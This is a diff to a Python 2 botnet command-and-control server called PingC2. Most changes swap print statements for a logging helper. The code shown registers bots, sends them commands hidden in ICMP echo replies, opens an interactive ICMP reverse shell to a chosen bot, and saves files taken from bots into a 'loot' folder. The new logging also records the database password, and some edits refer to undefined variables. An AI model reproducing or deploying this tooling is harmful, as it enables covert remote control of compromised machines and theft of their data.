@@ -11,6 +11,7 @@ from datetime import date
 #from impacket import ImpactDecoder
 #from impacket import ImpactPacket
 from threading import *
+from optparse import OptionParser
 import time
 import select
 import subprocess
@@ -24,10 +25,24 @@ import os
 from ConfigParser import SafeConfigParser
 from scapy.all import *
 
+#printLine method for debugging
+def printLine(line,flag):
+	logfile = file('log/pingc2.log', 'a')
+	if flag == 2:
+		logfile.write(line + '\n')
+		print line
+	if flag == 1:
+		logfile.write(line + '\n')
+		if not '[D]' in str(line):
+			print line
+	else:
+		logfile.write(line + '\n')
+	return
+
 # ICMP shell for single bot
 def icmpshell(botNum,botIP,botConnect):
 	import select
-	#print "[D] botconnect %s" % botConnect.value 
+	printLine("[D] botconnect %s" % (botConnect.value),flag)
 	if subprocess.mswindows:
         	sys.stderr.write('icmpsh master can only run on Posix systems\n')
        		exit(255)
@@ -73,7 +88,7 @@ def icmpshell(botNum,botIP,botConnect):
 
            	if 0 == len(buff):
                 	# Socket remotely closed
-               		print "[*] Socket closed"
+               		printLine("[*] Socket closed",flag)
 			sock.close()
                		sys.exit(0)
 
@@ -88,7 +103,7 @@ def icmpshell(botNum,botIP,botConnect):
 			ident = icmppacket.get_icmp_id()
                 	seq_id = icmppacket.get_icmp_seq()
                 	data = icmppacket.get_data_as_string()
-		#	print "[D] Data received: %s" % str(data)
+			printLine("[D] Data received: %s" % (str(data)),flag)
                		if len(data) > 0:
 				sys.stdout.write(data)
 				sys.stdout.flush()
@@ -96,9 +111,9 @@ def icmpshell(botNum,botIP,botConnect):
                		try:
                   		cmd = sys.stdin.readline()
                 		sys.stdout.flush()
-				#print "[D] cmd: %s" % cmd
+				printLine("[D] cmd: %s" % cmd,flag)
 			except Exception,e:
-                    		print str(e)
+                    		printLine(str(e),flag)
 
                 	# Set sequence number and identifier
                 	ip.set_ip_id(ip_ident)
@@ -117,14 +132,14 @@ def icmpshell(botNum,botIP,botConnect):
 
                		# Send it to the target host
                		sock.sendto(ip.get_packet(), (botIP, 0))
-			#print "[D] Sent: %s" % cmd
+			printLine("[D] Sent: %s" % cmd,flag)
 			if cmd == 'exit\n':
                 		botConnect.value = 0
 				sock.close()
 				return	
 
 def getBotIP(botId):
-	print "[*] Getting bot(%s) IP address" % botId
+	printLine("[*] Getting bot(%s) IP address" % botId,flag)
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
@@ -148,38 +163,38 @@ def catchFile(request, botId):
        	filename = 'bot' + str(botId) + '_' + fileContents[2]
         filename_clean = filename.replace('/','_')
 	filename_clean = 'loot/' + filename_clean
-	#print "[D] File contents: %s" % fileContents
-	#print "[*] Catching file (%s) from bot: %s" % (filename_clean,botId)
+	printLine("[D] File contents: %s" % (fileContent),flag)
+	printLine("[*] Catching file (%s) from bot: %s" % (filename_clean,botId),flag)
 	if fileContents[0] == '(FILE_START)':
-		print "[*] File start: %s" % filename_clean
+		printLine("[*] File start: %s" % (filename_clean),flag)
 		file = open(filename_clean, 'w')
 		file.write('')
 		file.close()
 	elif fileContents[0] == '(FILE_END)':
-		print "[*] File end: %s" % filename
+		printLine("[*] File end: %s" % (filename),flag)
 		file = open(filename_clean, 'a')
 		file.write('')
 		file.close()
 	else:
 		file = open(filename_clean, 'a')
-		#print "[D] Writing line to file: %s" % str(fileContents[2:])
+		printLine("[D] Writing line to file: %s" % (str(fileContents[2:])),flag)
 		write_line = ' '.join(map(str,fileContents[3:]))
 		write_line = write_line + '\n'
 		file.write(write_line)
-		#print "[D] Line written: %s" % str(line)
+		printLine("[D] Line written: %s" % (str(line)),flag)
 		file.close()
 	file.close()
 
 # Response function
 def sendPingResponse(dstIP,packetId,icmpId,command):
-	#print "[*] Creating response for %s" % botId
+	#printLine("[*] Creating response for using command=%s" %s (str(command)), flag)
 	resp = IP(dst=dstIP,id=packetId)/ICMP(type="echo-reply",id=icmpId)/str(command)
         #resp.show2()
         send(resp)
-        #print "\n[*] Response sent!"
+        printLine("\n[*] Response sent!",flag)
 
 def displayBots():
-	print "[*] Displaying bots!"
+	printLine("[*] Displaying bots!",flag)
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
@@ -195,7 +210,7 @@ def displayBots():
 	db.close()
 
 def updateBotSysinfo(botId,remoteIP,name,os):
-	print "[*] Updating bot info"
+	printLine("[*] Updating bot info",flag)
 	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
@@ -206,27 +221,30 @@ def updateBotSysinfo(botId,remoteIP,name,os):
 	try:
 		cur.execute("update bots set remoteip=%s,name=%s,os=%s where id=%s",(remoteIP,name,os,botId))
 	except Exception,e:
-		print "[X] " + str(e)
+		printLine("[X] " + (str(e)),flag)
 		return False
 	db.commit()
-	print "[*] Bot info updated"
+	printLine("[*] Bot info updated",flag)
 	db.close()
 	return True
 
 def doesBotExist(botId):
-	#print "[*] Checking bot existence"
-        db = MySQLdb.connect(host="localhost", # your host, usually localhost
+	printLine("[*] Checking bot existence",flag)
+        try:
+		db = MySQLdb.connect(host="localhost", # your host, usually localhost
                      user=dbusername.value, # your username
                      passwd=dbpassword.value, # your password
                      db="pingc2") # name of the data base
         # you must create a Cursor object. It will let
         #  you execute all the query you need
-        cur = db.cursor()
+        	cur = db.cursor()
+	except Exception,e:
+		printLine(str(e),flag)
 	query = "select * from bots where id=%i" % botId
-        #print "[D] Query: "+query
+        printLine("[D] Query: "+query, flag)
         cur.execute(query)
         if cur.fetchall():
-                #print "[*] Bot ID exists"
+                printLine("[*] Bot ID exists",flag)
 		db.close()
 		return True
 	else:
@@ -235,7 +253,7 @@ def doesBotExist(botId):
 
 
 def addBot(srcIP,name,os):
-	print "[*] Adding bot"
+	printLine("[*] Adding bot",flag)
 	botId=0
 	try:
 		db = MySQLdb.connect(host="localhost", # your host, usually localhost
@@ -249,23 +267,21 @@ def addBot(srcIP,name,os):
 		row = cur.fetchone()
 		if row[0]:
 			botId=int(row[0]) + 1
-			print "[*] Adding bot number %s!" % botId
+			printLine("[*] Adding bot number %s!" % (botId), flag)
 		else:
 			botId=1
-			print "[*} Adding first bot to PingC2!"
+			printLine("[*} Adding first bot to PingC2!",flag)
 		cur.execute("""insert into bots (remoteip,name,os,checkin) values(%s,%s,%s,%s)""",(srcIP,name,os,date.today()))
                 db.commit()
         except Exception,e:
-        	print "[X] Error: " + str(e)
-	print "[*] Bot ID(%s) added!" % botId
+        	printLine("[X] Error: " + (str(e)), flag)
+	printLine("[*] Bot ID(%s) added!" % (botId), flag)
 	db.close()
 	return botId	
 
 def displayMenu():
 	listener = False
 	print "\nChoose an option"
-        #print "[D] Debug: ", active_children()
-	#print len(active_children())
 	for proc in active_children():
 		if (proc.name == 'C2Listener'):
 			listener = True;
@@ -282,17 +298,16 @@ def displayMenu():
 # Inerrupt handler to kill process cleanly
 def handler(signum, frame):
 	print 'Bye!'		
-	sys.exit()
+	sys.exit(0)
 
 # Command and Control main function
 def c2main(command,botShell,botConnect):
 	print ""
-        print "[*] Command received from C2: %s" % command.value
+        printLine("[*] Command received from C2: %s" % (command.value), flag)
 	while True:
 		logfile_error = open('errors.log','w')
 		conf.verb = 0
         	count = 1
-		#print "[D] BotshllIP: %s" % botShellIP
 		filter = "icmp"
 		packet = sniff(count,filter=filter)
 		for p in packet:
@@ -302,70 +317,69 @@ def c2main(command,botShell,botConnect):
                         	ip_id = p['IP'].id
                        		icmp_id = p['ICMP'].id
         		
-				#print "[*] Request: " + request
+				printLine("[*] Request: " + request, flag)
 				if 'What shall I do master?' in request:
-					print "[*] Bot(%s) requesting command" % request[24:]
+					printLine("[*] Bot(%s) requesting command" % (request[24:]), flag)
 					botId = int(request[24:])
 					if doesBotExist(botId):
-						print "[*] Bot ID exists, ready to send command"
-						#print "[D] botId = %s and botShell.value = %s" % (botId,botShell.value)
+						printLine("[*] Bot ID exists, ready to send command", flag)
+						printLine("[D] botId = %s and botShell.value = %s" % (botId,botShell.value),flag)
 						if (botId == int(botShell.value)):
-							print "[*] Sending command to start shell to bot(%s) at %s" % (botId, p['IP'].src)
+							printLine("[*] Sending command to start shell to bot(%s) at %s" % (botId, p['IP'].src),flag)
 							sendPingResponse(p['IP'].src,ip_id,icmp_id,'shell')
 							botConnect.value = 1
 							return
 						else:
 							sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
-                                                	print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
+                                                	printLine("[*] Response sent to %s: %s" % (p['IP'].src,command.value),flag)
 							print "Option: "
                                         else:
-                                        	print "[*] Client not registered"
+                                        	printLine("[X] Client not registered",flag)
                         	# Checkin function
 				elif 'Checkin' in request:
 					# Build checkin database and info to capture
-					print "\n[*] %s checking in" % p['IP'].src
+					printLine("\n[*] %s checking in" % (p['IP'].src),flag)
 					checkinInfo = request[8:].split()
                                         botId = addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
 					sendId = "id="+str(botId)
-					#print "[D] SendId: ",sendId
 					sendPingResponse(p['IP'].src,ip_id,icmp_id,sendId)
 					#resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
                                         #resp.show2()
                                         #send(resp)
-                                        print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
+                                        printLine("\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value),flag)
                                         print "Option: "
 				elif 'sysinfo' in request:
 					# Build sysinfo capture system database
-                        		print "[D] Inside sysinfo"
+                        		printLine("[D] Inside sysinfo",flag)
 					sysinfo = request.split()					
 					#print "[D] Id: " + sysinfo[0]
-                                	print "\n[*] Received sysinfo from client: %s" % sysinfo[1]
+                                	printLine("\n[*] Received sysinfo from client: %s" % (sysinfo[1]),flag)
 					if doesBotExist(int(sysinfo[1])):
 						updateBotSysinfo(int(sysinfo[1]),p['IP'].src,sysinfo[3],sysinfo[2])
-                                               	print "[*] Updated sysinfo for machine(%s) from IP: %s" % (sysinfo[1],p['IP'].src)
+                                               	printLine("[*] Updated sysinfo for machine(%s) from IP: %s" % (sysinfo[1],p['IP'].src),flag)
 					else:
-						print "[*] Machine does not exist, ignoring"
+						printLine("[*] Machine does not exist, ignoring",flag)
 	
 					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                 	#resp.show2()
-                                	print "\n[*] Response sent: Thanks"
+                                	printLine("\n[*] Response sent: Thanks",flag)
                                 	send(resp)
                         		print "Option: "
 				elif '(FILE' in request:
 					if doesBotExist(int(request.split()[1])):
-						#print "[D] Catching file"
+						printLine("[D] Catching file",flag)
 						catchFile(request,int(request.split()[1]))
 						sendPingResponse(p['IP'].src,ip_id,icmp_id,"Thanks")
 					else:
-						print "[*] Machine does not exist, ignoring"
+						printLine("[*] Machine does not exist, ignoring",flag)
 				else:   
-                                        print "[**] Client not recognized"
+                                        printLine("[**] Client not recognized",flag)
                 	except:
 				error = "[X] ERROR: " + str(sys.exc_info()[0])
                         	logfile_error.write(error)
 
-def main():
-	print "	--------------------------------------------"
+def main(flag):
+	print "	---------------------------------------------"
 	print "	  _____    _                    _____   ___  "
  	print "	 |  __ \  (_)                  / ____| |__ \ "
  	print "	 | |__) |  _   _ __     __ _  | |         ) |"
@@ -377,19 +391,19 @@ def main():
         print "	 					    "
 	print "	 		Command Center              "
 	print "	 		   by NoCow		    "
-	print "	--------------------------------------------"
+	print "	---------------------------------------------"
 	global dbusername
 	global dbpassword
+	
 	conf_file = 'conf/pingc2.conf'
-        #print "[D] Getting bot Id"
         cp = SafeConfigParser()
         cp.optionxform = str # Preserves case sensitivity
         cp.readfp(open(conf_file, 'r'))
         section = 'Main'
         dbpass = cp.get(section,'dbpass')
-	#print "[D] dbpass=%s" % dbpass
+	printLine("[D] dbpass=%s" % (dbpass),flag)
 	dbuser = cp.get(section,'dbuser')
-	#print "[D] dbuser=%s" % dbuser
+	printLine("[D] dbuser=%s" % (dbuser),flag)
 	manager = Manager()
 	dbusername = manager.Namespace()
 	dbusername.value = dbuser
@@ -403,7 +417,7 @@ def main():
 	botConnect.value = 0
 	killsig = manager.Namespace()
 	killsig = 0
-	#print "[*] Command: %s" % command.value
+	printLine("[*] Command: %s" % (command.value),flag)
 	process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
 	displayMenu()
 	while True:
@@ -412,61 +426,62 @@ def main():
 		try:
 			option = raw_input("Option: ")
 		except Exception,e:
-			print "[X] Error: " + str(e)
+			printLine( "[X] Error: " + (str(e)),flag)
 		#print "[D] Option chosen: ",option
 		if option == '1':
 			command.value = raw_input("Enter command: ")
+			print "[*] Starting listener"
 			if (len(active_children()) > 1):
-				print "[*] Capture running. Stopping first."
+				printLine("[*] Capture running. Stopping first.",flag)
 				for proc in active_children():
 					if proc.name != 'SyncManager-1':		
-						#print "[D] Killing process: ", proc.name
 						proc.terminate()
-				print "[*] Starting new capture"
+				printLine( "[*] Starting new capture", flag)
 				try:
 					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
 					process.start()
 					if process.is_alive():
-						print "[*] C2 Listening - command: %s" % command.value
+						printLine( "[*] C2 Listening - command: %s" % (command.value), flag)
 					else:
-						print "[X] Error starting C2 listener"
+						printLine("[X] Error starting C2 listener",flag)
 				except Exception, e:
-					print "[X] Error: " + str(e)
+					printLine("[X] Error: " + (str(e)), flag)
 			else:
-				print "[*] No listener currently running. Starting..."
+				printLine( "[*] No listener currently running. Starting...",flag)
 				try:
 					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
 					process.start()
 					if process.is_alive():
-						print "[*] C2 Listening - command: %s" % command.value
+						printLine("[*] C2 Listening - command: %s" % (command.value),flag)
 					else:
-						print "[X] Error starting C2 listener"
+						printLine("[X] Error starting C2 listener",flag)
 				except Exception, e:
-					print "[X] Error: " + str(e)
+					printLine("[X] Error: " + (str(e)), flag)
 		elif option == '2':
-			print "[*] Displaying bots!"
+			printLine("[*] Displaying bots!",flag)
 			displayBots()
 		elif option == '3':
                         if process.is_alive():
                         	command.value = raw_input("Enter a command: ")
-				print "[*] C2 Listening - command: %s" % command.value
+				printLine("[*] C2 Listening - command: %s" % (command.value),flag)
                         else:
-                                print "[X] C2 listener not running. Please start listener first"
+                                printLine("[X] C2 listener not running. Please start listener first",flag)
 		elif option == '4':
-			print "[*] Bot control!"
+			printLine("[*] Bot control!",flag)
 			displayBots()
 			botNum = raw_input("Bot # to control: ")
-			print "[*] Controlling bot(%s)" % botNum
+			printLine("[*] Controlling bot(%s)" % (botNum),flag)
 		elif option == '5':
-			print "[*] Bot shell!"
+			printLine( "[*] Bot shell!", flag)
 			displayBots()
 			botNum = raw_input("Bot # for shell: ")
+			print "[*] Starting botshell for #%s" % botNum
 			if botNum == '123456789':
 				botShell.value = '123456789'
 			else:
 				botIP = getBotIP(botNum)
 				if botIP:
-					print "[*] Setting botshell value to %s" % botNum
+					printLine( "[*] Setting botshell value to %s" % (botNum), flag)
 					botShell.value = botNum
 					try:    
                                         	icmp_shell = Thread(name='ICMPshell',target=icmpshell,args=(botNum,botIP,botConnect,))
@@ -478,7 +493,7 @@ def main():
 										proc.terminate()
 								icmp_shell.start()
 								if icmp_shell.is_alive():
-									print "[*] ICMP shell started for bot(%s) at %s" % (botNum,botIP)
+									printLine("[*] ICMP shell started for bot(%s) at %s" % (botNum,botIP),flag)
 									icmp_shell.join()
 									botConnect.value = 0
 									botShell.value = 123456789
@@ -486,18 +501,18 @@ def main():
                                         					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
                                         					process.start()
                                         					if process.is_alive():
-                                                					print "[*] Restarting listener - command: %s" % command.value
+                                                					printLine( "[*] Restarting listener - command: %s" % (command.value),flag)
                                         					else:
-                                                					print "[X] Error starting C2 listener"
+                                                					printLine( "[X] Error starting C2 listener",flag)
                                 					except Exception, e:
-                                        					print "[X] Error: " + str(e)
+                                        					printLine( "[X] Error: " + (str(e)),flag)
 									break
                                                 		else:
-                                             				print "[X] Error starting ICMP shell"
+                                             				printLine( "[X] Error starting ICMP shell",flag)
                                         except Exception, e:
-                                        	print "[X] Error: " + str(e)
+                                        	printLine( "[X] Error: " + (str(e)),flag)
 				else:
-					print "[X] Bot does not exist!"
+					printLine("[X] Bot does not exist!",flag)
 			#print "[D] Bot IP for icmpsh: %s" % botIP
 		elif option == 'S':
 			for proc in active_children():
@@ -510,13 +525,24 @@ def main():
 			print "[D] Running Processes: ", active_children()
 		elif option == 'q':
 			for proc in active_children():
-				print "[*] Terminating process: " + str(proc.name)
-				proc.terminate()
-			print "[*] All processes terminated, exiting"
-			sys.exit()
+				printLine("[*] Terminating process: " + (str(proc.name)), flag)
+				if proc.is_alive():
+					proc.terminate()
+			printLine("[*] All processes terminated, exiting",flag)
+			return
 		else:
-			print "Invalid Option...please try again"
+			printLine("Invalid Option...please try again",flag)
 		displayMenu()
 	
 if __name__ == "__main__":
-	main()
+	global flag
+	parser = OptionParser(usage="%prog [-d]")
+	parser.add_option("-d", "--debug", help="add debug statements (1 for standard, 2 for more)",metavar="LEVEL")
+	(options, args) = parser.parse_args()	
+	flag = options.debug
+	printLine("--------------------------------------------",flag)
+	printLine("PingC2.py started on %s" % (date.today()),flag)
+	printLine("--------------------------------------------",flag)
+	printLine("[D] flag=%s" % (flag),flag)
+	main(flag)
+	sys.exit("Bye")
